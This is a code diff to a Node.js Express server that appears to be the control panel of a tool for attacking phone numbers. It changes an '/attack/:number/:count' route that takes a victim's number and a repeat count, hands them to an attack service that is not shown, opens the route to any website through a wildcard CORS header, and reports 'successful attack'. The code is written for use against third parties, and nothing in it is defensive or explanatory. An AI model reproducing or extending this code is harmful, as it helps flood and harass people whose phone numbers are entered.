@@ -5,21 +5,24 @@ const path = require('path');
 const app = express()
 //server config
 const port = 8080
-const host = '18.218.7.170'
 //attack config
 
+app.use('/public', express.static(path.join(__dirname,'public')));
 
 app.get('/start', function(req, res){
     console.log('Someone visit (/start) page')
     res.sendFile(path.join(__dirname+'/templates/index.html'))
 })
 
-app.get('/attack/:number', (req, res) => {
+app.get('/attack/:number/:count', (req, res) => {
     const victimsNumber = req.params.number
-    attackService.attack(victimsNumber)
+    const count = req.params.count
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Headers', 'origin, content-type, accept');
+    attackService.attack(victimsNumber, count)
     res.send(`successful attack on ${victimsNumber}`)
 })
 
 app.listen(port, function(reg, res){
-    console.log(`Sever listen on http://${host}:${port}`)
+    console.log(`Sever listen`)
 })
